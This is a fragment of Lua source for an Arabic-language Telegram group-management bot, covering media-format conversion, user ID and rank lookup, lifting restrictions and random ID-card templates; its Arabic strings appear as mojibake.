Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ Ψ§ΩΩΩΨ΅Ω ΩΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§ΩΩ Ψ§ΩΨ§Ω', 1, 'md')
return false
end
if result.content_.ID == "MessagePhoto" then
local photo = result.content_.photo_.id_
Devmfm:srem(mustafa.."mfm:FilterPhoto"..msg.chat_id_,photo)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±Ω ΩΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ Ψ§ΩΨ§Ω', 1, 'md')
return false
end
if result.content_.animation_.animation_ then
local idanimation = result.content_.animation_.animation_.persistent_id_
Devmfm:srem(mustafa.."mfm:FilterAnimation"..msg.chat_id_,idanimation)
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΨͺΩΩΩΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ ΩΩΩΩΩΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ Ψ§ΩΨ§Ω', 1, 'md')
return false
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unfilter_by_reply) 
end
end
--     Source Escobar     --
if text and (text == "ΨͺΩΨΉΩΩ ΨͺΨ­ΩΩΩ Ψ§ΩΨ΅ΩΨΊ" or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ­ΩΩΩ") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΩΨΉΩΩ ΨͺΨ­ΩΩΩ Ψ§ΩΨ΅ΩΨΊ*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:del(mustafa..'mfm:Thwel:mfm'..msg.chat_id_) 
end
if text and (text == "ΨͺΨΉΨ·ΩΩ ΨͺΨ­ΩΩΩ Ψ§ΩΨ΅ΩΨΊ" or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ­ΩΩΩ") and Manager(msg) and ChCheck(msg) then
local mustafaTEAM = '*β β« Ψ’ΩΩΩΩΩΨ’ ΨΉΩΨ²ΩΩΩΩΩΩΩΩΩΩΩΩΨ²ΩΩ β * '..mfmRank(msg)..' \n*β β« ΨͺΩΩΩΩ ΨͺΨΉΨ·ΩΩ ΨͺΨ­ΩΩΩ Ψ§ΩΨ΅ΩΨΊ*'
mfmmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, mustafaTEAM, 14, string.len(msg.sender_user_id_))
Devmfm:set(mustafa..'mfm:Thwel:mfm'..msg.chat_id_,true)  
end
if text == 'ΨͺΨ­ΩΩΩ' and not Devmfm:get(mustafa..'mfm:Thwel:mfm'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then 
function ThwelByReply(extra, result, success)
if result.content_.photo_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.photo_.sizes_[1].photo_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.png') 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.png')
os.execute('rm -rf ./'..msg.sender_user_id_..'.png') 
end   
if result.content_.sticker_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.sticker_.sticker_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.jpg') 
sendPhoto(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.jpg','*β β« ΨͺΩΩΩΩ ΨͺΨ­ΩΩΩ Ψ§ΩΩΩΨ΅Ω Ψ§ΩΩ Ψ΅ΩΨ±Ω*')     
os.execute('rm -rf ./'..msg.sender_user_id_..'.jpg') 
end
if result.content_.audio_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.audio_.audio_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.ogg') 
sendVoice(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.ogg',"*β β« ΨͺΩΩΩΩ ΨͺΨ­ΩΩΩ Ψ§ΩΩMp3 Ψ§ΩΩ Ψ¨Ψ΅ΩΩ*")
os.execute('rm -rf ./'..msg.sender_user_id_..'.ogg') 
end   
if result.content_.voice_ then 
local mfm = json:decode(https.request('https://api.telegram.org/bot'.. TokenBot..'/getfile?file_id='..result.content_.voice_.voice_.persistent_id_)) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..mfm.result.file_path,msg.sender_user_id_..'.mp3') 
sendAudio(msg.chat_id_, msg.id_, 0, 1,nil, './'..msg.sender_user_id_..'.mp3')  
os.execute('rm -rf ./'..msg.sender_user_id_..'.mp3') 
end
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),ThwelByReply) 
end
end
--     Source Escobar     --
if text ==("ΩΨ΄Ω") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) or text ==("Ψ§ΩΨ―Ω") and msg.reply_to_message_id_ ~= 0 and ChCheck(msg) then 
function id_by_reply(extra, result, success) 
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..data.id_) or 0
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..data.id_) or 0)
if Devmfm:sismember(mustafa..'mfm:BanAll:',result.sender_user_id_) then
Tkeed = 'ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω'
elseif Devmfm:sismember(mustafa..'mfm:MuteAll:',result.sender_user_id_) then
Tkeed = 'ΩΩΨͺΩΩ ΨΉΨ§Ω'
elseif Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ΩΨ­ΨΈΩΨ±'
elseif Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ΩΩΨͺΩΩ'
elseif Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_,result.sender_user_id_) then
Tkeed = 'ΩΩΩΨ―'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\n*β β« Ψ§ΩΩΩΩΨ― β * '..Tkeed
else 
Tked = '' 
end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',result.sender_user_id_) and SudoBot(msg) then
sudobot = '\n*β β« ΨΉΨ―Ψ― Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ β * '..(Devmfm:get(mustafa..'mfm:Sudos'..result.sender_user_id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(result.sender_user_id_,msg.chat_id_) ~= false then
CustomTitle = '\n*β β« ΩΩΨ¨Ω β * '..GetCustomTitle(result.sender_user_id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ', 1, 'md')
return false  end
if data.username_ == false then
Text = '*β β« Ψ§Ψ³ΩΩ β * ['..data.first_name_..'](tg://user?id='..result.sender_user_id_..')\n*β β« Ψ§ΩΨ―ΩΩ β * β¨ `'..result.sender_user_id_..'` β© π\n*β β« Ψ±ΨͺΨ¨ΨͺΩ β * '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..' π\n*β β« Ψ±Ψ³Ψ§Ψ¦ΩΩ β * β¨ '..user_msgs..' β© π\n*β β« ΨͺΩΨ§ΨΉΩΩ β * '..formsgs(user_msgs)..'π'..CustomTitle..' π\n*β β« ΩΩΨ§Ψ·Ω β * β¨ '..user_nkt..' β© π'..Tked 
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'*β β« ΩΨΉΨ±ΩΩ β * [@'..data.username_..'] π\n*β β« Ψ§ΩΨ―ΩΩ β * β¨ `'..result.sender_user_id_..'` β© π\n*β β« Ψ±ΨͺΨ¨ΨͺΩ β * '..IdRank(result.sender_user_id_, msg.chat_id_)..''..sudobot..' π\n*β β« Ψ±Ψ³Ψ§Ψ¦ΩΩ β * β¨ '..user_msgs..' β© π\n*β β« ΨͺΩΨ§ΨΉΩΩ β * '..formsgs(user_msgs)..' π'..CustomTitle..' π\n*β β« ΩΩΨ§Ψ·Ω β * β¨ '..user_nkt..' β© π'..Tked, 1, 'md')
end
end,nil)
end 
getMessage(msg.chat_id_, msg.reply_to_message_id_,id_by_reply) 
end
if text and text:match('^ΩΨ΄Ω @(.*)') and ChCheck(msg) or text and text:match('^Ψ§ΩΨ―Ω @(.*)') and ChCheck(msg) then 
local username = text:match('^ΩΨ΄Ω @(.*)') or text:match('^Ψ§ΩΨ―Ω @(.*)')
tdcli_function ({ID = "SearchPublicChat",username_ = username},function(extra, res, success) 
if res and res.message_ and res.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')
return false  end
if res.type_.ID == "ChannelChatInfo" then 
if res.type_.channel_.is_supergroup_ == false then
local ch = 'ΩΩΨ§Ψ©'
local chn = 'β β« ΩΩΨΉ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ β β¨ '..ch..' β©\nβ β« Ψ§ΩΨ§ΩΨ―Ω β β¨ `'..res.id_..'` β©\nβ β« Ψ§ΩΩΨΉΨ±Ω β β¨ [@'..username..'] β©\nβ β« Ψ§ΩΨ§Ψ³Ω β β¨ ['..res.title_..'] β©'
Dev_mfm(msg.chat_id_, msg.id_, 1,chn, 1, 'md')
else
local gr = 'ΩΨ¬ΩΩΨΉΩ'
local grr = 'β β« ΩΩΨΉ Ψ§ΩΨ­Ψ³Ψ§Ψ¨ β β¨ '..gr..' β©\nβ β« Ψ§ΩΨ§ΩΨ―Ω β β¨ '..res.id_..' β©\nβ β« Ψ§ΩΩΨΉΨ±Ω β β¨ [@'..username..'] β©\nβ β« Ψ§ΩΨ§Ψ³Ω β β¨ ['..res.title_..'] β©'
Dev_mfm(msg.chat_id_, msg.id_, 1,grr, 1, 'md')
end
return false  end
if res.id_ then  
tdcli_function ({ID = "GetUser",user_id_ = res.id_},function(arg,data) 
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..res.id_) or 0
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..res.id_) or 0)
if Devmfm:sismember(mustafa..'mfm:BanAll:',res.id_) then
Tkeed = 'ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω'
elseif Devmfm:sismember(mustafa..'mfm:MuteAll:',res.id_) then
Tkeed = 'ΩΩΨͺΩΩ ΨΉΨ§Ω'
elseif Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,res.id_) then
Tkeed = 'ΩΨ­ΨΈΩΨ±'
elseif Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,res.id_) then
Tkeed = 'ΩΩΨͺΩΩ'
elseif Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_,res.id_) then
Tkeed = 'ΩΩΩΨ―'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nβ β« Ψ§ΩΩΩΩΨ― β '..Tkeed
else 
Tked = '' 
end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',res.id_) and SudoBot(msg) then
sudobot = '\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ β '..(Devmfm:get(mustafa..'mfm:Sudos'..res.id_) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(res.id_,msg.chat_id_) ~= false then
CustomTitle = '\nβ β« ΩΩΨ¨Ω β '..GetCustomTitle(res.id_,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ', 1, 'md')
return false  end
Dev_mfm(msg.chat_id_, msg.id_, 1,'*β β« ΩΨΉΨ±ΩΩ β * [@'..data.username_..'] π\n*β β« Ψ§ΩΨ―ΩΩ β * β¨ `'..res.id_..'` β© π\n*β β« Ψ±ΨͺΨ¨ΨͺΩ β * '..IdRank(res.id_, msg.chat_id_)..''..sudobot..' π\n*β β« Ψ±Ψ³Ψ§Ψ¦ΩΩ β * β¨ '..user_msgs..' β© π\n*β β« ΨͺΩΨ§ΨΉΩΩ β * '..formsgs(user_msgs)..'π'..CustomTitle..' π\n*β β« ΩΩΨ§Ψ·Ω β * β¨ '..user_nkt..' β© π'..Tked, 1, 'md')
end,nil)
end 
end,nil)
return false 
end
if text and text:match('ΩΨ΄Ω (%d+)') and ChCheck(msg) or text and text:match('Ψ§ΩΨ―Ω (%d+)') and ChCheck(msg) then 
local iduser = text:match('ΩΨ΄Ω (%d+)') or text:match('Ψ§ΩΨ―Ω (%d+)')  
tdcli_function ({ID = "GetUser",user_id_ = iduser},function(arg,data) 
if data.message_ == "User not found" then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« ΩΩ ΩΨͺΩ Ψ§ΩΨͺΨΉΨ±Ω ΨΉΩΩ Ψ§ΩΨ­Ψ³Ψ§Ψ¨', 1, 'md')
return false  
end
local user_msgs = Devmfm:get(mustafa..'mfm:UsersMsgs'..msg.chat_id_..':'..iduser) or 0
local user_nkt = tonumber(Devmfm:get(mustafa..'mfm:GamesNumber'..msg.chat_id_..iduser) or 0)
if Devmfm:sismember(mustafa..'mfm:BanAll:',iduser) then
Tkeed = 'ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω'
elseif Devmfm:sismember(mustafa..'mfm:MuteAll:',iduser) then
Tkeed = 'ΩΩΨͺΩΩ ΨΉΨ§Ω'
elseif Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,iduser) then
Tkeed = 'ΩΨ­ΨΈΩΨ±'
elseif Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,iduser) then
Tkeed = 'ΩΩΨͺΩΩ'
elseif Devmfm:sismember(mustafa..'mfm:Tkeed:'..msg.chat_id_,iduser) then
Tkeed = 'ΩΩΩΨ―'
else
Tkeed = false
end
if Tkeed ~= false then
Tked = '\nβ β« Ψ§ΩΩΩΩΨ― β '..Tkeed
else 
Tked = '' 
end
if Devmfm:sismember(mustafa..'mfm:SudoBot:',iduser) and SudoBot(msg) then
sudobot = '\nβ β« ΨΉΨ―Ψ― Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ β '..(Devmfm:get(mustafa..'mfm:Sudos'..iduser) or 0)..'' 
else 
sudobot = '' 
end
if GetCustomTitle(iduser,msg.chat_id_) ~= false then
CustomTitle = '\nβ β« ΩΩΨ¨Ω β '..GetCustomTitle(iduser,msg.chat_id_)
else 
CustomTitle = '' 
end
if data.first_name_ == false then
Dev_mfm(msg.chat_id_, msg.id_, 1,'β β« Ψ§ΩΨ­Ψ³Ψ§Ψ¨ ΩΨ­Ψ°ΩΩ', 1, 'md')
return false  end
if data.username_ == false then
Text = '*β β« Ψ§Ψ³ΩΩ β * ['..data.first_name_..'](tg://user?id='..iduser..') π\n*β β« Ψ§ΩΨ―ΩΩ β * β¨ `'..iduser..'` β© π\n*β β« Ψ±ΨͺΨ¨ΨͺΩ β * '..IdRank(data.id_, msg.chat_id_)..''..sudobot..' π\n*β β« Ψ±Ψ³Ψ§Ψ¦ΩΩ β * β¨ '..user_msgs..' β© π\n*β β« ΨͺΩΨ§ΨΉΩΩ β * '..formsgs(user_msgs)..''..CustomTitle..' π\n*β β« ΩΩΨ§Ψ·Ω β * β¨ '..user_nkt..' β© π'..Tked
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
else
Dev_mfm(msg.chat_id_, msg.id_, 1,'*β β« ΩΨΉΨ±ΩΩ β * [@'..data.username_..'] π\n*β β« Ψ§ΩΨ―ΩΩ β * β¨ `'..iduser..'` β© π\n*β β« Ψ±ΨͺΨ¨ΨͺΩ β * '..IdRank(data.id_, msg.chat_id_)..''..sudobot..' π\n*β β« Ψ±Ψ³Ψ§Ψ¦ΩΩ β * β¨ '..user_msgs..' β© π\n*β β« ΨͺΩΨ§ΨΉΩΩ β * '..formsgs(user_msgs)..''..CustomTitle..' π\n*β β« ΩΩΨ§Ψ·Ω β * β¨ '..user_nkt..' β© π'..Tked, 1, 'md')
end
end,nil)
return false 
end 
--     Source Escobar     --
if text == 'ΩΨ΄Ω Ψ§ΩΩΩΩΨ―' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function kshf_by_reply(extra, result, success)
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,result.sender_user_id_) then muted = 'ΩΩΨͺΩΩ' else muted = 'ΨΊΩΨ± ΩΩΨͺΩΩ' end
if Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,result.sender_user_id_) then banned = 'ΩΨ­ΨΈΩΨ±' else banned = 'ΨΊΩΨ± ΩΨ­ΨΈΩΨ±' end
if Devmfm:sismember(mustafa..'mfm:BanAll:',result.sender_user_id_) then banall = 'ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω' else banall = 'ΨΊΩΨ± ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω' end
if Devmfm:sismember(mustafa..'mfm:MuteAll:',result.sender_user_id_) then muteall = 'ΩΩΨͺΩΩ ΨΉΨ§Ω' else muteall = 'ΨΊΩΨ± ΩΩΨͺΩΩ ΨΉΨ§Ω' end
if Devmfm:sismember(mustafa..'mfm:Tkeed:',result.sender_user_id_) then tkeed = 'ΩΩΩΨ―' else tkeed = 'ΨΊΩΨ± ΩΩΩΨ―' end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ­ΨΈΨ± Ψ§ΩΨΉΨ§Ω β '..banall..'\nβ β« Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω β '..muteall..'\nβ β« Ψ§ΩΨ­ΨΈΨ± β '..banned..'\nβ β« Ψ§ΩΩΨͺΩ β '..muted..'\nβ β« Ψ§ΩΨͺΩΩΨ― β '..tkeed..'', 1, 'md')  
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),kshf_by_reply) 
end
if text and text:match('^ΩΨ΄Ω Ψ§ΩΩΩΩΨ― @(.*)') and Admin(msg) and ChCheck(msg) then 
local username = text:match('^ΩΨ΄Ω Ψ§ΩΩΩΩΨ― @(.*)') 
function kshf_by_username(extra, result, success)
if result.id_ then
if Devmfm:sismember(mustafa..'mfm:Muted:'..msg.chat_id_,result.id_) then muted = 'ΩΩΨͺΩΩ' else muted = 'ΨΊΩΨ± ΩΩΨͺΩΩ' end
if Devmfm:sismember(mustafa..'mfm:Ban:'..msg.chat_id_,result.id_) then banned = 'ΩΨ­ΨΈΩΨ±' else banned = 'ΨΊΩΨ± ΩΨ­ΨΈΩΨ±' end
if Devmfm:sismember(mustafa..'mfm:BanAll:',result.id_) then banall = 'ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω' else banall = 'ΨΊΩΨ± ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω' end
if Devmfm:sismember(mustafa..'mfm:MuteAll:',result.id_) then muteall = 'ΩΩΨͺΩΩ ΨΉΨ§Ω' else muteall = 'ΨΊΩΨ± ΩΩΨͺΩΩ ΨΉΨ§Ω' end
if Devmfm:sismember(mustafa..'mfm:Tkeed:',result.id_) then tkeed = 'ΩΩΩΨ―' else tkeed = 'ΨΊΩΨ± ΩΩΩΨ―' end
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ­ΨΈΨ± Ψ§ΩΨΉΨ§Ω β '..banall..'\nβ β« Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω β '..muteall..'\nβ β« Ψ§ΩΨ­ΨΈΨ± β '..banned..'\nβ β« Ψ§ΩΩΨͺΩ β '..muted..'\nβ β« Ψ§ΩΨͺΩΩΨ― β '..tkeed..'', 1, 'md')  
else
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')  
end
end
resolve_username(username,kshf_by_username) 
end
if text == 'Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ―' and tonumber(msg.reply_to_message_id_) > 0 and Admin(msg) and ChCheck(msg) then 
function unbanreply(extra, result, success) 
if tonumber(result.sender_user_id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ Ψ§ΩΨ¨ΩΨͺ ΩΩΩΨ³ ΩΨ―Ω ΩΩΩΨ―', 1, 'md')  
return false  
end 
ReplyStatus(msg,result.sender_user_id_,"Reply","*β β« ΨͺΩΩΩΩ Ψ±ΩΨΉ ΩΩΩΨ―Ω*")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.sender_user_id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_,result.sender_user_id_) Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_,result.sender_user_id_) Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_,result.sender_user_id_)   
end
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),unbanreply) 
end
if text and text:match('^Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― (%d+)') and Admin(msg) and ChCheck(msg) then 
local user = text:match('Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― (%d+)') 
if tonumber(user) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ Ψ§ΩΨ¨ΩΨͺ ΩΩΩΨ³ ΩΨ―Ω ΩΩΩΨ―', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = user},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ Ψ§Ψ³ΨͺΨ·ΨΉ Ψ§Ψ³ΨͺΨ?Ψ±Ψ§Ψ¬ Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ', 1, 'md') 
return false  
end
ReplyStatus(msg,user,"Reply","*β β« ΨͺΩΩΩΩ Ψ±ΩΨΉ ΩΩΩΨ―Ω*")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..user.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_,user) Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_,user) Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_,user)   
end,nil)  
end
if text and text:match('^Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― @(.*)') and Admin(msg) and ChCheck(msg) then  
local username = text:match('Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― @(.*)')  
function unbanusername(extra,result,success)  
if result and result.message_ and result.message_ == "USERNAME_NOT_OCCUPIED" then 
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« *Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ± Ψ΅Ψ­ΩΨ­*', 1, 'md')  
return false  
end
if result and result.type_ and result.type_.channel_ and result.type_.channel_.ID == "Channel" then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΩΩΨ³ ΩΨΉΨ±Ω Ψ­Ψ³Ψ§Ψ¨', 1, 'md') 
return false  
end
if tonumber(result.id_) == tonumber(mustafa) then  
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« Ψ§ΩΨ§ Ψ§ΩΨ¨ΩΨͺ ΩΩΩΨ³ ΩΨ―Ω ΩΩΩΨ―', 1, 'md')  
return false  
end 
tdcli_function ({ID = "GetUser",user_id_ = result.id_},function(arg,data) 
if data and data.code_ and data.code_ == 6 then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΩ Ψ§Ψ³ΨͺΨ·ΨΉ Ψ§Ψ³ΨͺΨ?Ψ±Ψ§Ψ¬ Ψ§ΩΩΨΉΩΩΩΨ§Ψͺ', 1, 'md') 
return false  
end
ReplyStatus(msg,result.id_,"Reply","*β β« π°ΨͺΩΩΩΩ Ψ±ΩΨΉ ΩΩΩΨ―Ω*")  
HTTPS.request("https://api.telegram.org/bot" .. TokenBot .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..result.id_.. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")  
Devmfm:srem(mustafa..'mfm:Tkeed:'..msg.chat_id_,result.id_) Devmfm:srem(mustafa..'mfm:Ban:'..msg.chat_id_,result.id_) Devmfm:srem(mustafa..'mfm:Muted:'..msg.chat_id_,result.id_)   
end,nil)   
end  
resolve_username(username,unbanusername) 
end 
--     Source Escobar     --
if Manager(msg) then
if text and text:match("^ΨͺΨΊΩΩΨ± Ψ§ΩΨ§ΩΨ―Ω$") and ChCheck(msg) or text and text:match("^ΨͺΨΊΩΨ± Ψ§ΩΨ§ΩΨ―Ω$") and ChCheck(msg) then 
local List = {
[[
γ πππ΄π π¨ #username π₯² .
γ πΌππΆ π¨ #msgs π₯² .
γ πππ° π¨ #stast π₯² .
γ πΈπ³ π¨ #id π₯² .
]],
[[
β­- ππππ #stast π―. π
β?- πππππ #username π―. π
β­- πππππ #msgs π―. π
β­- ππ π #id π―. π
]],
[[
β π° πΎππππππ π»π π?ππππ β
β’ π€ | πΌπ¬πΊ : #username ββββ
β’ π€ | πΊπ»π¨ : #stast π§π»ββοΈ β₯
β’ π€ | π°π« : #id ββββ
β’ π€ | π΄πΊπ? : #msgs π
]],
[[
β ππππ π€± #username π¦΄ .
β πππ π€± #msgs π¦΄ .
β πππ π€± #stast π¦΄ .
β ππ π€± #id π¦΄ .
]],
[[
πΌπ?πΆ πΌππππ΅πππ : #username 
πΌπ?πΆ πΊππππ : #stast 
πΌπ?πΆ ππ : #id 
πΌπ?πΆ π?ππππΊ : #game 
πΌπ?πΆ π΄πππ : #msgs
]],
[[
β: ππππ #stast π―βΈπ.
β: πππππ #username π―βΈπ.
β: πππππ #msgs π―βΈπ.
β: ππ π #id π―βΈπ.
]],
[[
ββ’π?π¬ππ« : #username π£¬  
ββ’π¦π¬π   : #msgs π£¬ 
ββ’π¬π­π : #stast π£¬ 
ββ’π’π  : #id π£¬
]],
[[
- π¬ ππ¬ππ« : #username π .
- π¬ ππ¬π  : #msgs π .
- π¬ ππ­π : #stast π .
- π¬ ππ : #id π .
]],
[[
.π£ πͺπ¨ππ§π£ππ’π , #username  
.π£ π¨π©ππ¨π© , #stast  
.π£ π‘πΏ , #id  
.π£ πππ’π¨ , #game 
.π£ π’π¨ππ¨ , #msgs
]],
[[
β β« ππππ β¬ #username 
β β« ππ β¬ #id
β β« πππππ β¬ #stast
β β« ππππ β¬ #cont 
β β« ππππ β¬ #msgs
β β« ππππ β¬ #game
]],
[[
α― π¨π¦ππ₯π‘π?πΊπ . #username πΊπΈ κ°
α― π¦π§π?π¦π§ . #stast πΊπΈ κ°
α― ππ . #id πΊπΈ κ°
α― ππ?πΊππ¦ . #game πΊπΈ κ°
α― πΊπ¦ππ¦ . #msgs πΊπΈ κ°
]],
[[
- α΄Ρα΄ΚΙ΄α΄α΄α΄ β₯β’ #username .
- α΄ΡΙ’Ρ β₯β’ #msgs .
- Ρα΄α΄α΄Ρ β₯β’ #stast .
- Κα΄α΄Κ Ιͺα΄ β₯β’ #id  .
- α΄α΄Ιͺα΄ α΄sΙ’ β₯β’ #edit .
- α΄α΄α΄α΄ΙͺΚs β₯β’ #auto . 
- Ι’α΄α΄α΄ β₯β’ #game .
]]}
local Text_Rand = List[math.random(#List)]
Devmfm:set(mustafa.."mfm:GpIds:Text"..msg.chat_id_,Text_Rand)
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","β β« ΨͺΩΩΩΩ ΨͺΨΊΩΨ± ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω")  
end
--     Source Escobar     --
if SecondSudo(msg) then
